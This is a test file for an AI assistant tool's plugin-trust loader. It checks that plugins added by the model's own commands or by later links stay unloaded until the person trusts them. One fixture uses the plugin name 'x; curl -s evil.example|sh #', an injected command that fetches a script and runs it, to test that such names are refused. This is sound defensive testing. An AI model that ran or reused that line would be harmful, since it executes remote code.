// A plugin in plugins-enabled/ loads only when the person trusts it (src/loader/trust.ts):
// one linked there by a command after the first start is not loaded — none of its code
// runs — and is named with the command that trusts it.
import { afterEach, expect, test } from 'bun:test';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadPlugins } from '../loader/build';
import { createPluginRepo } from '../loader/repo';
import { hostGroupTools } from '../loader/host-group';
import type { Untrusted } from '../loader/trust';
import { runPlugins } from '../main';
import { MODEL_SHELL_ENV } from '../config/load';
import { HOST_API } from '../version';
import { ScriptedModel, bootApp } from './helpers/scripted';

afterEach(() => {
  delete process.env[MODEL_SHELL_ENV];
  process.exitCode = 0;
});

// An install root; each plugin writes `<name>.ran` beside it when its module runs.
function install() {
  const root = mkdtempSync(join(tmpdir(), 'fa-trust-'));
  const availableDir = join(root, 'plugins-available');
  const enabledDir = join(root, 'plugins-enabled');
  mkdirSync(availableDir, { recursive: true });
  mkdirSync(enabledDir, { recursive: true });
  const repo = createPluginRepo({ availableDir, enabledDir, projectRoot: root });
  const out: string[] = [];
  const err: string[] = [];
  const io = { out: (l: string) => out.push(l), err: (l: string) => err.push(l) };
  const cli = (...args: string[]) => runPlugins(args, {}, repo, { availableDir, enabledDir, io });
  const load = async () => {
    const notes: string[] = [];
    const untrusted: Untrusted[] = [];
    const warn = console.warn;
    console.warn = () => {};
    const plugins = await loadPlugins({ config: {}, repo, enabledDir, notes, untrusted }).finally(() => { console.warn = warn; });
    return { names: plugins.map((p) => p.name), notes, untrusted };
  };
  const ran = (name: string) => existsSync(join(root, `${name}.ran`));
  return { root, availableDir, enabledDir, repo, out, err, cli, load, ran };
}

// A plugin directory at `dir`, whose module leaves a mark in `root` when it runs.
function pluginAt(dir: string, name: string, root: string) {
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'manifest.json'), JSON.stringify({ name, version: '1.0.0', hostApi: HOST_API }));
  writeFileSync(join(dir, 'index.ts'), `import { writeFileSync } from 'node:fs';\nwriteFileSync(${JSON.stringify(join(root, `${name}.ran`))}, 'ran');\nexport default () => ({ name: ${JSON.stringify(name)} });\n`);
  return dir;
}

test('the first start trusts what is enabled, once, and says so; a link a command adds later is not loaded until `plugins trust`', async () => {
  const d = install();
  symlinkSync(pluginAt(join(d.availableDir, 'alpha'), 'alpha', d.root), join(d.enabledDir, 'alpha'));
  // A plugin kept in a repository of its own, linked from outside.
  symlinkSync(pluginAt(join(d.root, 'elsewhere', 'beta'), 'beta', d.root), join(d.enabledDir, 'beta'));

  const first = await d.load();
  expect(first.names).toEqual(expect.arrayContaining(['alpha', 'beta']));
  expect(first.notes.filter((n) => n.startsWith('[plugins] trusted at first start:'))).toHaveLength(1);
  expect(first.notes.find((n) => n.startsWith('[plugins] trusted at first start:'))).toMatch(/alpha.*beta|beta.*alpha/);
  const again = await d.load();
  expect(again.names).toEqual(expect.arrayContaining(['alpha', 'beta']));
  expect(again.notes.some((n) => n.includes('trusted at first start'))).toBe(false);

  // A command links a plugin in.
  symlinkSync(pluginAt(join(d.root, 'dropped', 'evil'), 'evil', d.root), join(d.enabledDir, 'evil'));
  const next = await d.load();
  expect(next.names).not.toContain('evil');
  expect(d.ran('evil')).toBe(false);
  expect(next.untrusted).toEqual([{ name: 'evil' }]);
  expect(next.notes).toContain('[plugins] skip evil: not trusted — flow-assist plugins trust evil');

  await d.cli('ls');
  expect(d.out.find((l) => l.startsWith('evil '))).toContain('[active, not trusted — flow-assist plugins trust evil]');

  await d.cli('trust', 'evil');
  expect(d.out.at(-1)).toMatch(/^plugin 'evil' trusted: .+evil — restart/);
  const trusted = await d.load();
  expect(trusted.names).toContain('evil');
  expect(d.ran('evil')).toBe(true);
});

test('the start screen names an untrusted plugin with the command that trusts it', async () => {
  const model = new ScriptedModel();
  const ui = await bootApp(model, 110, 28, undefined, {}, { untrusted: [{ name: 'evil' }] });
  expect(ui.backend.lastFrame).toContain('plugins');
  expect(ui.backend.lastFrame).toContain('evil  not trusted — flow-assist plugins trust evil');
  ui.app.unmount();
});

test('a trusted link retargeted elsewhere is untrusted again', async () => {
  const d = install();
  symlinkSync(pluginAt(join(d.availableDir, 'alpha'), 'alpha', d.root), join(d.enabledDir, 'alpha'));
  expect((await d.load()).names).toContain('alpha');
  rmSync(join(d.root, 'alpha.ran'));
  unlinkSync(join(d.enabledDir, 'alpha'));
  const other = pluginAt(join(d.root, 'swapped', 'alpha'), 'alpha', d.root);
  symlinkSync(other, join(d.enabledDir, 'alpha'));
  const after = await d.load();
  expect(after.names).not.toContain('alpha');
  expect(d.ran('alpha')).toBe(false);
  expect(after.untrusted[0]).toMatchObject({ name: 'alpha' });
  expect(after.untrusted[0]!.now).toContain('swapped');
  expect(after.untrusted[0]!.was).toContain('plugins-available');
  expect(after.notes.find((n) => n.startsWith('[plugins] skip alpha:'))).toMatch(/its link led to .+plugins-available\/alpha, now to .+swapped\/alpha/);

  // The start screen says both, not the log alone.
  const ui = await bootApp(new ScriptedModel(), 160, 30, undefined, {}, { untrusted: after.untrusted });
  expect(ui.backend.lastFrame.replace(/\s+/g, ' ')).toMatch(/alpha not trusted — its link led to .*plugins-available\/alpha, now to .*swapped\/alpha/);
  ui.app.unmount();

  // `plugins trust` shows both targets and records nothing without a yes.
  const cli = (...args: string[]) => runPlugins(args, {}, d.repo, { availableDir: d.availableDir, enabledDir: d.enabledDir, io: { out: (l) => d.out.push(l), err: (l) => d.err.push(l) }, confirm: null });
  await cli('trust', 'alpha');
  expect(process.exitCode).toBe(1);
  expect(d.err.join('\n')).toMatch(/was trusted at .+plugins-available\/alpha/);
  expect(d.err.join('\n')).toMatch(/now leads to .+swapped\/alpha/);
  expect(d.err.at(-1)).toContain('flow-assist plugins trust alpha --yes');
  expect((await d.load()).names).not.toContain('alpha');
  process.exitCode = 0;
  // A no on the terminal records nothing; a yes, or --yes, does.
  const asked: string[] = [];
  await runPlugins(['trust', 'alpha'], {}, d.repo, { availableDir: d.availableDir, enabledDir: d.enabledDir, io: { out: () => {}, err: () => {} }, confirm: async (q) => { asked.push(q); return false; } });
  expect(asked[0]).toContain('swapped');
  expect((await d.load()).names).not.toContain('alpha');
  process.exitCode = 0;
  await cli('trust', 'alpha', '--yes');
  expect(d.out.at(-1)).toMatch(/trusted: .+swapped\/alpha \(was .+plugins-available\/alpha\)/);
  expect((await d.load()).names).toContain('alpha');
});

test('from a command the model runs, `plugins trust` is refused and a first check trusts nothing', async () => {
  const d = install();
  symlinkSync(pluginAt(join(d.availableDir, 'alpha'), 'alpha', d.root), join(d.enabledDir, 'alpha'));
  process.env[MODEL_SHELL_ENV] = '1';
  // No record yet: the model's command does not get to be the first start.
  const inShell = await d.load();
  expect(inShell.names).not.toContain('alpha');
  await d.cli('trust', 'alpha');
  expect(process.exitCode).toBe(1);
  expect(d.err.at(-1)).toContain('a command the assistant runs cannot trust a plugin');
  expect((await d.load()).names).not.toContain('alpha');
  delete process.env[MODEL_SHELL_ENV];
  process.exitCode = 0;
  // The person's own start is the first one.
  expect((await d.load()).names).toContain('alpha');
});

test('an archive installed through the CLI is trusted and loads; from the model\'s command it is installed but not trusted', async () => {
  const d = install();
  await d.load(); // the first start, with nothing enabled
  const src = mkdtempSync(join(tmpdir(), 'fa-trust-src-'));
  pluginAt(join(src, 'notes'), 'notes', d.root);
  const archive = join(mkdtempSync(join(tmpdir(), 'fa-trust-tgz-')), 'notes-1.0.0.tar.gz');
  execFileSync('tar', ['-czf', archive, '-C', src, 'notes']);
  await d.cli('install', archive);
  expect(d.out.at(-1)).toContain("plugin 'notes' v1.0.0 installed");
  expect((await d.load()).names).toContain('notes');

  pluginAt(join(src, 'other'), 'other', d.root);
  const second = join(mkdtempSync(join(tmpdir(), 'fa-trust-tgz-')), 'other-1.0.0.tar.gz');
  execFileSync('tar', ['-czf', second, '-C', src, 'other']);
  process.env[MODEL_SHELL_ENV] = '1';
  await d.cli('install', second);
  delete process.env[MODEL_SHELL_ENV];
  expect(d.err.at(-1)).toContain("plugin 'other' is not trusted");
  const loaded = await d.load();
  expect(loaded.names).not.toContain('other');
  expect(loaded.untrusted.map((u) => u.name)).toContain('other');
});

test('a kit update — the directory removed, a newer archive unpacked in its place, the relative link made again — keeps the plugin trusted', async () => {
  const d = install();
  const src = mkdtempSync(join(tmpdir(), 'fa-kit-src-'));
  pluginAt(join(src, 'tracker'), 'tracker', d.root);
  const archive = join(mkdtempSync(join(tmpdir(), 'fa-kit-tgz-')), 'tracker-1.0.0.tar.gz');
  execFileSync('tar', ['-czf', archive, '-C', src, 'tracker']);
  // The kit's installer, step for step: no binary involved.
  const kit = () => {
    rmSync(join(d.availableDir, 'tracker'), { recursive: true, force: true });
    execFileSync('tar', ['-xzf', archive, '-C', d.availableDir]);
    execFileSync('ln', ['-sfn', '../plugins-available/tracker', join(d.enabledDir, 'tracker')]);
  };
  kit();
  expect((await d.load()).names).toContain('tracker');
  kit();
  const after = await d.load();
  expect(after.names).toContain('tracker');
  expect(after.untrusted).toEqual([]);
});

test('`plugins remove` forgets the trust: the link put back by a command is not loaded', async () => {
  const d = install();
  const dir = pluginAt(join(d.availableDir, 'alpha'), 'alpha', d.root);
  symlinkSync(dir, join(d.enabledDir, 'alpha'));
  expect((await d.load()).names).toContain('alpha');
  await d.cli('remove', 'alpha');
  symlinkSync(dir, join(d.enabledDir, 'alpha'));
  expect((await d.load()).names).not.toContain('alpha');
});

test('a plugin the model installs through host:plugins_install is installed but not trusted, and the result says how to trust it', async () => {
  const d = install();
  await d.load();
  pluginAt(join(d.availableDir, 'gamma'), 'gamma', d.root);
  const group = hostGroupTools(d.repo);
  const res = String(await group.exec('host:plugins_install', { name: 'gamma' }, {} as never));
  expect(res).toContain('installed but not trusted');
  expect(res).toContain('flow-assist plugins trust gamma');
  expect(existsSync(join(d.enabledDir, 'gamma'))).toBe(true);
  expect((await d.load()).names).not.toContain('gamma');
});

test('an entry whose name is not a plugin name is refused and never loaded, and no command line is built from it', async () => {
  const d = install();
  await d.load(); // the first start
  const evil = 'x; curl -s evil.example|sh #';
  symlinkSync(pluginAt(join(d.root, 'dropped', 'x'), 'x', d.root), join(d.enabledDir, evil));
  // Even at a first start it is not trusted.
  const fresh = install();
  symlinkSync(pluginAt(join(fresh.root, 'dropped', 'y'), 'y', fresh.root), join(fresh.enabledDir, evil));
  const first = await fresh.load();
  expect(first.untrusted).toEqual([{ name: evil, refused: true }]);
  expect(fresh.ran('y')).toBe(false);

  const r = await d.load();
  expect(d.ran('x')).toBe(false);
  expect(r.untrusted).toEqual([{ name: evil, refused: true }]);
  const line = r.notes.find((n) => n.includes('curl'))!;
  expect(line).not.toContain('plugins trust');
  expect(line).toContain('refused');
  await d.cli('ls');
  expect(d.out.join('\n')).toContain(`${JSON.stringify(evil)}  [refused`);
  await d.cli('trust', evil);
  expect(process.exitCode).toBe(1);
  expect(d.err.at(-1)).toContain('is not a plugin name');
  process.exitCode = 0;
  expect((await d.repo.install('a;b')).error).toContain('invalid name');
  const ui = await bootApp(new ScriptedModel(), 120, 28, undefined, {}, { untrusted: r.untrusted });
  expect(ui.backend.lastFrame).toContain('refused — a plugin name is letters, digits');
  expect(ui.backend.lastFrame).not.toContain('plugins trust x;');
  ui.app.unmount();
});

test('a shown trust command quotes a word a shell would act on', async () => {
  const { trustCommand, untrustedText } = await import('../loader/trust');
  expect(trustCommand('repo')).toBe('flow-assist plugins trust repo');
  expect(trustCommand("a b'c")).toBe(`flow-assist plugins trust 'a b'\\''c'`);
  expect(untrustedText({ name: 'repo' })).toBe('not trusted — flow-assist plugins trust repo');
});

test('an unreadable record trusts nothing and the start screen says so; only a missing one is a first start, which the start screen names', async () => {
  const { pluginTrustPath } = await import('../loader/trust');
  const d = install();
  symlinkSync(pluginAt(join(d.availableDir, 'alpha'), 'alpha', d.root), join(d.enabledDir, 'alpha'));
  const trustNotes: string[] = [];
  const warn = console.warn;
  console.warn = () => {};
  const plugins = await loadPlugins({ config: {}, repo: d.repo, enabledDir: d.enabledDir, trustNotes }).finally(() => { console.warn = warn; });
  expect(plugins.map((p) => p.name)).toContain('alpha');
  expect(trustNotes).toEqual(['trusted at first start: alpha']);
  const ui = await bootApp(new ScriptedModel(), 120, 28, undefined, {}, { trustNotes });
  expect(ui.backend.lastFrame).toContain('trusted at first start: alpha');
  ui.app.unmount();

  symlinkSync(pluginAt(join(d.root, 'dropped', 'evil'), 'evil', d.root), join(d.enabledDir, 'evil'));
  for (const text of ['{', '', '{}', '{"dirs": {}}']) {
    writeFileSync(pluginTrustPath(), text);
    const notes: string[] = [];
    console.warn = () => {};
    const loaded = await loadPlugins({ config: {}, repo: d.repo, enabledDir: d.enabledDir, trustNotes: notes }).finally(() => { console.warn = warn; });
    expect(loaded.map((p) => p.name)).not.toContain('evil');
    expect(loaded.map((p) => p.name)).not.toContain('alpha');
    expect(notes[0]).toContain('cannot be read — no plugin is trusted');
  }
  // Trusting one by hand replaces it, the old text kept beside it.
  await d.cli('trust', 'alpha');
  const next = await d.load();
  expect(next.names).toContain('alpha');
  expect(next.names).not.toContain('evil');
});

test('the first start is one per record: a plugins-enabled directory first seen after it starts with nothing trusted', async () => {
  const a = install();
  symlinkSync(pluginAt(join(a.availableDir, 'alpha'), 'alpha', a.root), join(a.enabledDir, 'alpha'));
  expect((await a.load()).names).toContain('alpha');
  // Another install root — a cloned or planted directory the person starts in later.
  const b = install();
  symlinkSync(pluginAt(join(b.availableDir, 'beta'), 'beta', b.root), join(b.enabledDir, 'beta'));
  const r = await b.load();
  expect(r.names).not.toContain('beta');
  expect(b.ran('beta')).toBe(false);
  expect(r.untrusted).toEqual([{ name: 'beta' }]);
});

test('a link removed by hand is forgotten, so the model\'s install under that name is never trusted by the old word', async () => {
  const d = install();
  const dir = pluginAt(join(d.availableDir, 'gamma'), 'gamma', d.root);
  symlinkSync(dir, join(d.enabledDir, 'gamma'));
  expect((await d.load()).names).toContain('gamma');
  unlinkSync(join(d.enabledDir, 'gamma'));
  // The next start forgets it…
  await d.load();
  symlinkSync(dir, join(d.enabledDir, 'gamma'));
  expect((await d.load()).names).not.toContain('gamma');
  // …and the model's install forgets it before it links, with no start in between.
  await d.cli('trust', 'gamma');
  unlinkSync(join(d.enabledDir, 'gamma'));
  const res = String(await hostGroupTools(d.repo).exec('host:plugins_install', { name: 'gamma' }, {} as never));
  expect(res).toContain('installed but not trusted');
  expect((await d.load()).names).not.toContain('gamma');
});
